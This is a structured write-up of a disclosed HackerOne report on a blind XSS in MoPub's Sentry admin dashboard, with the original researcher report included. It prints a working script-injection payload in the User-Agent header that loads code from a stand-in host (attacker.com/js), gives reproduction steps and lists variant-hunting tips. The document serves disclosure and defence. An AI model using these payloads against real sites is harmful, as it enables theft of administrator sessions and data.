# Blind XSS in MoPub Marketplace Admin Production Sentry Dashboard via User-Agent Header

## Metadata
- **Source:** HackerOne
- **Report:** 275518 | https://hackerone.com/reports/275518
- **Submitted:** 2017-10-08
- **Reporter:** harisec
- **Program:** Twitter/MoPub
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Blind XSS, HTTP Header Injection, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A blind XSS vulnerability exists in the MoPub demand.mopub.com login endpoint where unsanitized User-Agent headers are reflected without proper encoding in the Sentry admin dashboard. An attacker can inject malicious JavaScript payloads via the User-Agent header that execute when administrators view error logs or related dashboard pages, allowing arbitrary code execution in the admin context.

## Attack scenario
1. Attacker crafts an HTTP request to https://demand.mopub.com/accounts/login/ with a malicious JavaScript payload embedded in the User-Agent header
2. The payload (e.g., '>"</title></style></textarea></script><script/src=attacker.com/js></script>) is logged/stored by the application or associated monitoring system (Sentry)
3. When a legitimate administrator logs into the Sentry dashboard at sentry-test.mopub.com and navigates to the marketplace admin production page, the stored payload is reflected in an HTML context
4. The malicious User-Agent value is rendered without proper HTML encoding inside an <option> tag, allowing the attacker's script tags to break out of the intended context
5. The injected <script> tag executes in the browser, loading the attacker's JavaScript from their controlled domain
6. Attacker's script can steal session cookies, CSRF tokens, sensitive dashboard data, or perform administrative actions on behalf of the victim

## Root cause
The application fails to properly encode HTTP headers (specifically User-Agent) when displaying them in HTML contexts. The User-Agent header value is reflected in a Sentry dashboard page within an <option> tag without HTML entity encoding, allowing context escape via crafted quote and tag sequences.

## Attacker mindset
A security researcher identifying a blind XSS vector in an admin-facing monitoring dashboard. The attacker recognizes that request headers logged by error tracking systems (Sentry) are often displayed to privileged users without sanitization. By injecting into the User-Agent header, they exploit the delayed reflection pattern (blind XSS) where payload execution occurs when admins view logs rather than immediately. This is a stealthy attack vector since initial requests appear normal.

## Defensive takeaways
- Implement strict output encoding: Always HTML-encode all HTTP headers and user-controllable data when rendering in HTML context, regardless of source trust
- Use Content Security Policy (CSP) with strict-dynamic and nonce-based script execution to mitigate injected script execution
- Sanitize and validate all HTTP headers at ingress; implement length limits and character restrictions on headers
- Apply defense-in-depth: validate on server-side, encode at presentation layer, and use CSP as fallback
- Regularly audit monitoring/logging systems (like Sentry integrations) for reflection of unsanitized user input
- Use templating engines with auto-escaping enabled (e.g., Jinja2 with autoescape=True)
- Implement security headers: X-XSS-Protection, X-Content-Type-Options, X-Frame-Options
- Establish monitoring for blind XSS payloads in logs; implement alerting for suspicious User-Agent patterns
- Conduct security testing specifically for blind XSS vectors in admin dashboards and logging interfaces

## Variant hunting
Check other HTTP headers (Referer, X-Forwarded-For, X-Originating-IP, Custom headers) for similar blind XSS in dashboard displays
Test error tracking integration points (Sentry, New Relic, DataDog) that display request metadata without encoding
Audit all admin/internal dashboard pages that render request details, error logs, or user session information
Search for <option>, <textarea>, <title>, and other HTML contexts where header values might be reflected
Test with various HTML/JS escape sequences: event handlers (onload=), data attributes, SVG contexts
Check if other MoPub/Twitter properties have similar patterns of unencoded header reflection
Look for blind XSS in cookie reflection, custom header echoes, and redirect parameter logging
Test for stored XSS variants where payloads persist in database logs or cached responses

## MITRE ATT&CK
- T1190
- T1566
- T1204
- T1566.002
- T1557.002

## Notes
This is a high-quality blind XSS report demonstrating full attack chain including payload delivery, storage through request logging, reflection in admin context, and successful script execution with data exfiltration. The researcher properly identified the execution origin (Twitter IP), extracted DOM evidence, and demonstrated cookie/session access from admin context. The vulnerability combines header injection with improper encoding in a monitoring system—a common weak point where security is often overlooked. The fact that Sentry itself was vulnerable to reflecting unencoded request metadata is particularly notable as such systems are trusted to be secure.

## Full report
<details><summary>Expand</summary>

**Summary:** 
I've identified a Blind XSS vulnerability that fires in the `Mobpub Marketplace Admin Production | Sentry` dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.

**Description:** 
I've sent the following HTTPS request to the following URL `https://demand.mopub.com/accounts/login/`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

Please note that the value of the `User-Agent` header is set to an **Blind XSS payload** (I've used `attacker.com/js` as an example but initially it was set to an script loaded from my test domain `thx.bz`.

Some time later after this initial request I've received two hits and the script from `thx.bz` was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.

I've extracted the content of the browser DOM (attached to this report as **DOM.html**) and other interesting information:

**Dashboard Page URL**

`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`

**User IP Address**
`█████████`

**Title**
`Marketplace Admin Production | Sentry`

**User-Agent**
`█████████`

**Cookies**
`██████
`
 
**Execution Origin**
`http://sentry-test.mopub.com`

If you open the attachment **DOM.html** in a browser and search for `thx.bz` you will see that the value of the `User-Agent` is reflected inside a `<option>` tag without proper encoding and it was possible to escape the context and inject an additional `SCRIPT` tag.

The IP address that was used to visit the dashboard is `███████` and I've verified that it belongs to Twitter.

## Steps To Reproduce:

- Send the following HTTPS request (while replacing `attacker.com/js` with a domain/URL you control and where you can inspect the web server logs).

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

- Login into `http://sentry-test.mopub.com/` using administrative credentials and visit the vulnerable URL 
`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`.

- At this point a script should be loaded from your domain (the one you've used instead of `attacker.com/js`).

## Impact: 

An attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard `Mobpub Marketplace Admin Production | Sentry`.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

I've attached the contents of browser DOM where the Blind XSS triggered (`DOM.html`), more information about the execution context `bxss-report.html` and screenshots from the the browser DOM.



</details>

---
*Analysed by Claude on 2026-05-12*
